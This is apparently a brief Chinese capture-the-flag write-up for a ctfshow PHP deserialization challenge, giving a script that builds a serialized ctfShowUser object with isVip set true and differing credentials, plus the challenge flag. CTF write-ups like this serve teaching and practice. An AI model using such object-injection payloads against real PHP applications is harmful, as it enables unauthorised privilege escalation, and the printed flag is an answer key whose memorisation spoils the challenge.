在上一题的基础上加了一个判断，要求反序列化后的username和password不相等。
```
<?php
class ctfShowUser{
    public $isVip;
    public $username='xxxxxx';
    public $password='xxxxx';
}
$a = new ctfShowUser();
$a->isVip = true;
echo urlencode(serialize($a));
?>
```
flag : ctfshow{cc7c465f-5f0a-4c41-acdb-8cfe5bd6ceab}